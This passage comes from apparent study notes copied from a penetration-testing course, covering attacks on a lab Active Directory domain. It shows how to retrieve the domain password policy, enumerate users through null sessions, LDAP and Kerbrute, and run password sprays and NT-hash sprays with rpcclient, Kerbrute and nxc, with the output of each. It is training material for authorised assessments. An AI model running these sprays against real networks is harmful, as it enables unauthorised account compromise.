ACADEMY-EA-DC01\nNetBIOS domain name: INLANEFREIGHT\nDNS domain: INLANEFREIGHT.LOCAL\nFQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n\n =======================================\n|    Policies via RPC for 172.16.5.5    |\n =======================================\n[*] Trying port 445/tcp\n[+] Found policy:\ndomain_password_information:\n  pw_history_length: 24\n  min_pw_length: 8\n  min_pw_age: 1 day 4 minutes\n  max_pw_age: not set\n  pw_properties:\n  - DOMAIN_PASSWORD_COMPLEX: true\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\ndomain_lockout_information:\n  lockout_observation_window: 30 minutes\n  lockout_duration: 30 minutes\n  lockout_threshold: 5\ndomain_logoff_information:\n  force_logoff_time: not set\n\nCompleted after 5.41 seconds\n```\n\nEnum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the `-oA` flag.\n\n#### Displaying the contents of ilfreight.json\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat ilfreight.json \n\n{\n    \"target\": {\n        \"host\": \"172.16.5.5\",\n        \"workgroup\": \"\"\n    },\n    \"credentials\": {\n        \"user\": \"\",\n        \"password\": \"\",\n        \"random_user\": \"yxditqpc\"\n    },\n    \"services\": {\n        \"SMB\": {\n            \"port\": 445,\n            \"accessible\": true\n        },\n        \"SMB over NetBIOS\": {\n            \"port\": 139,\n            \"accessible\": true\n        }\n    },\n    \"smb_dialects\": {\n        \"SMB 1.0\": false,\n        \"SMB 2.02\": true,\n        \"SMB 2.1\": true,\n        \"SMB 3.0\": true,\n        \"SMB1 only\": false,\n        \"Preferred dialect\": \"SMB 3.0\",\n        \"SMB signing required\": true\n    },\n    \"sessions_possible\": true,\n    \"null_session_possible\": true,\n\n<SNIP>\n```\n\n## Enumerating Null Session - from Windows\n\nIt is less common to do this type of null session attack from Windows, but we could use the command `net use \\\\host\\ipc$ \"\" /u:\"\"` to establish a null session from a windows machine and confirm if we can perform more of this type of attack.\n\n#### Establish a null session from windows\n\nEnumerating & Retrieving Password Policies\n\n```cmd-session\nC:\\htb> net use \\\\DC01\\ipc$ \"\" /u:\"\"\nThe command completed successfully.\n```\n\nWe can also use a username/password combination to attempt to connect. Let's see some common errors when trying to authenticate:\n\n#### Error: Account is Disabled\n\nEnumerating & Retrieving Password Policies\n\n```cmd-session\nC:\\htb> net use \\\\DC01\\ipc$ \"\" /u:guest\nSystem error 1331 has occurred.\n\nThis user can't sign in because this account is currently disabled.\n```\n\n#### Error: Password is Incorrect\n\nEnumerating & Retrieving Password Policies\n\n```cmd-session\nC:\\htb> net use \\\\DC01\\ipc$ \"password\" /u:guest\nSystem error 1326 has occurred.\n\nThe user name or password is incorrect.\n```\n\n#### Error: Account is locked out (Password Policy)\n\nEnumerating & Retrieving Password Policies\n\n```cmd-session\nC:\\htb> net use \\\\DC01\\ipc$ \"password\" /u:guest\nSystem error 1909 has occurred.\n\nThe referenced account is currently locked out and may not be logged on to.\n```\n\n## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind\n\n[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.\n\nWith an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable. One example command to get the password policy is as follows:\n\n#### Using ldapsearch\n\nEnumerating & Retrieving Password Policies\n\n```shell-session\ndrxh3kr@htb[/htb]$ ldapsearch -H ldap://172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n\nforceLogoff: -9223372036854775808\nlockoutDuration: -18000000000\nlockOutObservationWindow: -18000000000\nlockoutThreshold: 5\nmaxPwdAge: -9223372036854775808\nminPwdAge: -864000000000\nminPwdLength: 8\nmodifiedCountAtLastProm: 0\nnextRid: 1002\npwdProperties: 1\npwdHistoryLength: 24\n```\n\nNote: In newer versions of `ldapsearch`, the `-h` parameter was deprecated in favor for `-H`.\n\nHere we can see the minimum password length of 8, lockout threshold of 5, and password complexity is set (`pwdProperties` set to `1`).\n\n---\n\n## Enumerating the Password Policy - from Windows\n\nIf we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.\n\nUsing built-in commands is helpful if we land on a Windows system and cannot transfer tools to it, or we are positioned on a Windows system by the client, but have no way of getting tools onto it. One example using the built-in net.exe binary is:\n\n#### Using net.exe\n\nEnumerating & Retrieving Password Policies\n\n```cmd-session\nC:\\htb> net accounts\n\nForce user logoff how long after time expires?:       Never\nMinimum password age (days):                          1\nMaximum password age (days):                          Unlimited\nMinimum password length:                              8\nLength of password history maintained:                24\nLockout threshold:                                    5\nLockout duration (minutes):                           30\nLockout observation window (minutes):                 30\nComputer role:                                        SERVER\nThe command completed successfully.\n```\n\nHere we can glean the following information:\n\n- Passwords never expire (Maximum password age set to Unlimited)\n- The minimum password length is 8 so weak passwords are likely in use\n- The lockout threshold is 5 wrong passwords\n- Accounts remained locked out for 30 minutes\n\nThis password policy is excellent for password spraying. The eight-character minimum means that we can try common weak passwords such as `Welcome1`. The lockout threshold of 5 means that we can attempt 2-3 (to be safe) sprays every 31 minutes without the risk of locking out any accounts. If an account has been locked out, it will automatically unlock (without manual intervention from an admin) after 30 minutes, but we should avoid locking out `ANY` accounts at all costs.\n\nPowerView is also quite handy for this:\n\n#### Using PowerView\n\nEnumerating & Retrieving Password Policies\n\n```powershell-session\nPS C:\\htb> import-module .\\PowerView.ps1\nPS C:\\htb> Get-DomainPolicy\n\nUnicode        : @{Unicode=yes}\nSystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;\n                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;\n                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;\n                 LSAAnonymousNameLookup=0}\nKerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}\nVersion        : @{signature=\"$CHICAGO$\"; Revision=1}\nRegistryValues : @{MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\NoLMHash=System.Object[]}\nPath           : \\\\INLANEFREIGHT.LOCAL\\sysvol\\INLANEFREIGHT.LOCAL\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHI\n                 NE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\nGPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}\nGPODisplayName : Default Domain Policy\n```\n\nPowerView gave us the same output as our `net accounts` command, just in a different format but also revealed that password complexity is enabled (`PasswordComplexity=1`).\n\nAs with Linux, we have many tools at our disposal to retrieve the password policy while on a Windows system, whether it is our attack system or a system provided by the client. PowerView/SharpView are always good bets, as are CrackMapExec, SharpMapExec, and others. The choice of tools depends on the goal of the assessment, stealth considerations, any anti-virus or EDR in place, and other potential restrictions on the target host. Let's cover a few examples.\n\n---\n\n## Analyzing the Password Policy\n\nWe've now pulled the password policy in numerous ways. Let's go through the policy for the INLANEFREIGHT.LOCAL domain piece by piece.\n\n- The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)\n- The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)\n- The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes\n- Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script\n- Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (`Password1` or `Welcome1` would satisfy the \"complexity\" requirement here, but are still clearly weak passwords).\n\nThe default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:\n\n|Policy|Default Value|\n|---|---|\n|Enforce password history|24 days|\n|Maximum password age|42 days|\n|Minimum password age|1 day|\n|Minimum password length|7|\n|Password must meet complexity requirements|Enabled|\n|Store passwords using reversible encryption|Disabled|\n|Account lockout duration|Not set|\n|Account lockout threshold|0|\n|Reset account lockout counter after|Not set|\n\n---\n\n## Next Steps\n\nNow that we have the password policy in hand, we need to create a target user list to perform our password spraying attack. Remember that sometimes we will not be able to obtain the password policy if we are performing external password spraying (or if we are on an internal assessment and cannot retrieve the policy using any of the methods shown here). In these cases, we `MUST` exercise extreme caution not to lock out accounts. We can always ask our client for their password policy if the goal is as comprehensive an assessment as possible. If asking for the policy does not fit the expectations of the assessment or the client does not want to provide it, we should run one, max two, password spraying attempts (regardless of whether we are internal or external) and wait over an hour between attempts if we indeed decide to attempt two. While most organizations will have a lockout threshold of 5 bad password attempts, a lockout duration of 30 minutes and accounts will automatically unlock, we cannot always count on this being normal. I have seen plenty of organizations with a lockout threshold of 3, requiring an admin to intervene and unlock accounts manually.\n\n`We do not want to be the pentester that locks out every account in the organization!`\n\nLet's now prepare to launch our password spraying attacks by gathering a list of target users.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/11-Password Spraying - Making a Target User List",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/11-Password Spraying - Making a Target User List.md",
    "title": "11 Password Spraying   Making A Target User List",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Detailed User Enumeration To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a ta...",
    "category": "02_CPTS",
    "content": "\n---\n\n## Detailed User Enumeration\n\nTo mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:\n\n- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller\n- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list\n- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users\n- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist\n\nNo matter the method we choose, it is also vital for us to consider the domain password policy. If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy. Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help us formulate the list of passwords we will try in our spray attempts. Knowing the account lockout threshold and bad password timer will tell us how many spray attempts we can do at a time without locking out any accounts and how many minutes we should wait between spray attempts.\n\nAgain, if we do not know the password policy, we can always ask our client, and, if they won't provide it, we can either try one very targeted password spraying attempt as a \"hail mary\" if all other options for a foothold have been exhausted. We could also try one spray every few hours in an attempt to not lock out any accounts. Regardless of the method we choose, and if we have the password policy or not, we must always keep a log of our activities, including, but not limited to:\n\n- The accounts targeted\n- Domain Controller used in the attack\n- Time of the spray\n- Date of the spray\n- Password(s) attempted\n\nThis will help us ensure that we do not duplicate efforts. If an account lockout occurs or our client notices suspicious logon attempts, we can supply them with our notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.\n\n---\n\n## SMB NULL Session to Pull User List\n\nIf you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or `SYSTEM` access on a Windows host, then you can easily query Active Directory for this information.\n\nIt’s possible to do this using the SYSTEM account because it can `impersonate` the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.\n\nSome tools that can leverage SMB NULL sessions and LDAP anonymous binds include [enum4linux](https://github.com/portcullislabs/enum4linux), [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), and [nxc](https://github.com/byt3bl33d3r/nxc), among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with `enum4linux` with the `-U` flag.\n\n#### Using enum4linux\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$ enum4linux -U 172.16.5.5  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n\nadministrator\nguest\nkrbtgt\nlab_adm\nhtb-student\navazquez\npfalcon\nfanthony\nwdillard\nlbradford\nsgage\nasanchez\ndbranch\nccruz\nnjohnson\nmholliday\n\n<SNIP>\n```\n\nWe can use the `enumdomusers` command after connecting anonymously using `rpcclient`.\n\n#### Using rpcclient\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$ rpcclient -U \"\" -N 172.16.5.5\n\nrpcclient $> enumdomusers \nuser:[administrator] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[lab_adm] rid:[0x3e9]\nuser:[htb-student] rid:[0x457]\nuser:[avazquez] rid:[0x458]\n\n<SNIP>\n```\n\nFinally, we can use `nxc` with the `--users` flag. This is a useful tool that will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.\n\n#### Using nxc --users Flag\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$ nxc smb 172.16.5.5 --users\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613\n\n<SNIP>\n```\n\n---\n\n## Gathering Users with LDAP Anonymous\n\nWe can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and [ldapsearch](https://linux.die.net/man/1/ldapsearch). If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter. We can learn more about these search filters in the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.\n\n#### Using ldapsearch\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n\nguest\nACADEMY-EA-DC01$\nACADEMY-EA-MS01$\nACADEMY-EA-WEB01$\nhtb-student\navazquez\npfalcon\nfanthony\nwdillard\nlbradford\nsgage\nasanchez\ndbranch\n\n<SNIP>\n```\n\nTools such as `windapsearch` make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.\n\n#### Using windapsearch\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u \"\" -U\n\n[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 172.16.5.5\n[+] Getting defaultNamingContext from Root DSE\n[+]\tFound: DC=INLANEFREIGHT,DC=LOCAL\n[+] Attempting bind\n[+]\t...success! Binded as: \n[+]\t None\n\n[+] Enumerating all AD users\n[+]\tFound 2906 users: \n\ncn: Guest\n\ncn: Htb Student\nuserPrincipalName: htb-student@inlanefreight.local\n\ncn: Annie Vazquez\nuserPrincipalName: avazquez@inlanefreight.local\n\ncn: Paul Falcon\nuserPrincipalName: pfalcon@inlanefreight.local\n\ncn: Fae Anthony\nuserPrincipalName: fanthony@inlanefreight.local\n\ncn: Walter Dillard\nuserPrincipalName: wdillard@inlanefreight.local\n\n<SNIP>\n```\n\n---\n\n## Enumerating Users with Kerbrute\n\nAs mentioned in the `Initial Enumeration of The Domain` section, if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.\n\nThis tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.\n\nLet's try out this method using the [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist of 48,705 possible common usernames in the format `flast`. The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using `Kerbrute`.\n\n#### Kerbrute User Enumeration\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop\n\n2022/02/17 22:16:11 >  Using KDC(s):\n2022/02/17 22:16:11 >  \t172.16.5.5:88\n\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t jjones@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t sbrown@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t tjohnson@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t jwilson@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t bdavis@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t njohnson@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t asanchez@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t dlewis@inlanefreight.local\n2022/02/17 22:16:11 >  [+] VALID USERNAME:\t ccruz@inlanefreight.local\n\n<SNIP>\n```\n\nWe've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.\n\nIf we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.\n\n---\n\n## Credentialed Enumeration to Build our User List\n\nWith valid credentials, we can use any of the tools stated previously to build a user list. A quick and easy way is using nxc.\n\n#### Using nxc with Valid Credentials\n\nPassword Spraying - Making a Target User List\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users\n\n[sudo] password for htb-student: \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\htb-student:Academy_student_AD! \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\n\n<SNIP>\n```\n\n---\n\n## Now for the Fun\n\nNow that we've covered creating a target user list for spraying and discussed password policies, let's get our hands dirty performing password spraying attacks a few ways from a Linux attack host and then from a Windows host.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/12-Internal Password Spraying - from Linux",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/12-Internal Password Spraying - from Linux.md",
    "title": "12 Internal Password Spraying   From Linux",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from ...",
    "category": "02_CPTS",
    "content": "\n---\n\nNow that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.\n\n---\n\n## Internal Password Spraying from a Linux Host\n\nOnce we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. `Rpcclient` is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login. We can filter out invalid login attempts by `grepping` for `Authority` in the response. The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.\n\n#### Using a Bash one-liner for the Attack\n\nInternal Password Spraying - from Linux\n\n```shell-session\nfor u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n```\n\nLet's try this out against the target environment.\n\nInternal Password Spraying - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n\nAccount Name: tjohnson, Authority Name: INLANEFREIGHT\nAccount Name: sgage, Authority Name: INLANEFREIGHT\n```\n\nWe can also use `Kerbrute` for the same attack as discussed previously.\n\n#### Using Kerbrute for the Attack\n\nInternal Password Spraying - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop\n\n2022/02/17 22:57:12 >  Using KDC(s):\n2022/02/17 22:57:12 >  \t172.16.5.5:88\n\n2022/02/17 22:57:12 >  [+] VALID LOGIN:\t sgage@inlanefreight.local:Welcome1\n2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds\n```\n\nThere are multiple other methods for performing password spraying from Linux. Another great option is using `nxc`. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for `+` to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.\n\n#### Using nxc & Filtering Logon Failures\n\nInternal Password Spraying - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\avazquez:Password123 \n```\n\nAfter getting one (or more!) hits with our password spraying attack, we can then use `nxc` to validate the credentials quickly against a Domain Controller.\n\n#### Validating the Credentials with nxc\n\nInternal Password Spraying - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb 172.16.5.5 -u avazquez -p Password123\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\avazquez:Password123\n```\n\n---\n\n## Local Administrator Password Reuse\n\nInternal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts.\n\nnxc is a handy tool for attempting this attack. It is worth targeting high-value hosts such as `SQL` or `Microsoft Exchange` servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.\n\nWhen working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers. Also, if we find non-standard local administrator accounts such as `bsmith`, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named `ajones`, it is worth trying the same password on their admin account (if the user has one), for example, `ajones_adm`, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.\n\nSometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.\n\n#### Local Admin Spraying with nxc\n\nInternal Password Spraying - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n\nSMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\\administrator 